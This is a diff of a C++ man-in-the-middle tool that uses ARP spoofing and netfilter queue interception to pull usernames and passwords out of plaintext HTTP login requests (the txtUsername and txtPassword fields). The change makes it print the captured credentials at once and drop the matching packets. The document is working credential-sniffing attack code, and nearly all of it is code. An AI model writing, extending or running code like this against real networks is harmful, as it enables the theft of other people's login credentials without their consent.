@@ -314,8 +314,7 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 }
 
 
-string username = "";
-string password = "";
+
 static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
     char *packet;
@@ -333,7 +332,6 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
         struct tcphdr *tcp_header = (struct tcphdr *)(packet + ip_header->ihl * 4);
         if (ip_header->protocol == IPPROTO_TCP && ntohs(tcp_header->dest) == 80)
         {
-            // HTTP packet
             // cout << "HTTP packet" << endl;
             // cout << "Source IP: " << inet_ntoa(*(struct in_addr *)&ip_header->saddr) << endl;
             // cout << "Destination IP: " << inet_ntoa(*(struct in_addr *)&ip_header->daddr) << endl;
@@ -344,10 +342,12 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
             string payload = packet + ip_header->ihl * 4 + tcp_header->doff * 4;
             if (payload.find("txtUsername") != string::npos)
             {
-                username = payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12);
+                cout << "Username: "<< payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12)<<endl;
                 // after & is password txtPassword=
-                password = payload.substr(payload.find("txtPassword") + 12, payload.find("\n", payload.find("txtPassword")) - payload.find("txtPassword") - 12);
+                cout<< "Password: "<< payload.substr(payload.find("txtPassword") + 12, payload.find("\n", payload.find("txtPassword")) - payload.find("txtPassword") - 12)<<endl;
+                nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
             }
+            // clear queue
         }
     }
     return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
@@ -402,13 +402,6 @@ void analyze_packet(){
     while ((rv = recv(fd, buf, sizeof(buf), 0)))
     {
         nfq_handle_packet(h, buf, rv);
-        if (username != "" && password != "")
-        {
-            cout << "Username: " << username << endl;
-            cout << "Password: " << password << endl;
-            username = "";
-            password = "";
-        }
     }
     nfq_destroy_queue(qh);
     nfq_close(h);
